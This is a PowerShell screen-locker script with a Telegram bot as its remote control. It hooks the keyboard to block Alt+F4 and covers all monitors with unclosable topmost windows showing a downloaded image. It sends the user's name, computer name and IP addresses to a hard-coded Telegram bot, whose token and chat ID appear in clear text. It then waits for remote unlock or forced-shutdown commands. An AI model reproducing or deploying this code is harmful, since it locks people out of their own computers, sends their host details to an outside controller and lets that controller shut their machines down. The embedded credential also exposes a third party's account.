# SETTINGS
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"
$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$chatID = "656189986"
$user = $env:USERNAME
$pc = $env:COMPUTERNAME
$unlockCommand = "/unlock$user"
$lockCommand = "/lock$user"
$shutdownCommand = "/shutdown$user"
$lockFile = "$env:APPDATA\Microsoft\lock_status.txt"

# DOWNLOAD IMAGE
Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -UseBasicParsing

# SEND TELEGRAM MESSAGE
function Send-Telegram-Message {
    try {
        $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
            $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80'
        })[0].IPAddress
    } catch { $ipLocal = "n/a" }

    try { $ipPublic = (Invoke-RestMethod "https://api.ipify.org") } catch { $ipPublic = "n/a" }

    $message = "PC-ul $user ($pc) a fost blocat.`nLocal IP: $ipLocal | Public IP: $ipPublic`n`nComenzi disponibile:`n$unlockCommand`n$lockCommand`n$shutdownCommand"
    $body = @{ chat_id = $chatID; text = $message } | ConvertTo-Json -Compress
    Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'
}

# MARK LOCK STATE
if (-not (Test-Path $lockFile)) { "locked" | Out-File $lockFile -Force }

# LOAD REQUIRED ASSEMBLIES
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# BLOCK ALT+F4 via global low-level keyboard hook
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KeyBlocker {
    private static IntPtr hookId = IntPtr.Zero;
    private static bool altPressed = false;
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc proc = HookCallback;
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100, WM_SYSKEYDOWN = 0x0104;
    private const int WM_KEYUP = 0x0101, WM_SYSKEYUP = 0x0105;

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    public static void Block() {
        hookId = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(null), 0);
    }
    public static void Unblock() {
        if (hookId != IntPtr.Zero) UnhookWindowsHookEx(hookId);
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0) {
            int vkCode = Marshal.ReadInt32(lParam);
            if (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN) {
                if (vkCode == 0x43) Environment.Exit(0); // C key exits
                if (vkCode == 0x12) altPressed = true; // Alt key
                if (altPressed && vkCode == 0x73) return (IntPtr)1; // Alt+F4
            }
            if (wParam == (IntPtr)WM_KEYUP || wParam == (IntPtr)WM_SYSKEYUP) {
                if (vkCode == 0x12) altPressed = false;
            }
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }
}
"@
[KeyBlocker]::Block()

# TELEGRAM STATUS & UI INIT
Send-Telegram-Message
$script:AllowClose = $false

# FULLSCREEN UI
$forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
    $form = New-Object Windows.Forms.Form -Property @{
        FormBorderStyle = 'None'
        WindowState = 'Maximized'
        StartPosition = 'Manual'
        TopMost = $true
        Location = $screen.Bounds.Location
        Size = $screen.Bounds.Size
        Cursor = [System.Windows.Forms.Cursors]::None
        BackColor = 'Black'
    }

    $pb = New-Object Windows.Forms.PictureBox -Property @{
        Image = [System.Drawing.Image]::FromFile($tempImagePath)
        Dock = 'Fill'
        SizeMode = 'StretchImage'
    }

    $form.Add_FormClosing({
        if (-not $script:AllowClose) {
            $_.Cancel = $true
        }
    })
    $form.Add_Deactivate({ $form.Activate() })

    $form.Controls.Add($pb)
    $form.Show()
    $form
}

# TELEGRAM COMMAND POLLING
$offset = 0
try {
    $updates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?timeout=1"
    if ($updates.result) {
        $offset = ($updates.result | Select-Object -Last 1).update_id + 1
    }
} catch {}

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 3000
$timer.Add_Tick({
    try {
        $url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
        $resp = Invoke-RestMethod $url -TimeoutSec 5
        foreach ($update in $resp.result) {
            $offset = $update.update_id + 1
            $msg = $update.message.text.ToLower()
            if ($msg -eq $unlockCommand.ToLower()) {
                "unlocked" | Out-File $lockFile -Force
                $script:AllowClose = $true
                [System.Windows.Forms.Application]::Exit()
            }
            elseif ($msg -eq $shutdownCommand.ToLower()) {
                "unlocked" | Out-File $lockFile -Force
                Stop-Computer -Force
            }
            elseif ($msg -eq $lockCommand.ToLower()) {
                "locked" | Out-File $lockFile -Force
                # Optionally relaunch script if needed
            }
        }
    } catch {}
})
$timer.Start()

# RUN APP
[System.Windows.Forms.Application]::Run()

# CLEANUP
$timer.Stop()
[KeyBlocker]::Unblock()
